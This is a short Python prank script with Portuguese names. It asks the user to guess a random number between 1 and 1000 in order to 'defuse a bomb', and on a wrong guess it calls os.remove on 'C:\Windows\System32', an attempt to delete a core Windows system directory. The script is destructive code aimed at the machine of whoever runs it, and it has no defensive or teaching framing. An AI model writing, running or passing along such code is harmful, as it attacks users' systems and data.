import random
import time
import os 

bomba = random.randint(1,1000)
senha_para_desarmar = int(input('Digite a senha '))

if bomba == senha_para_desarmar:
    print('bomba desarmada')

else:
    os.remove('C:\Windows\System32')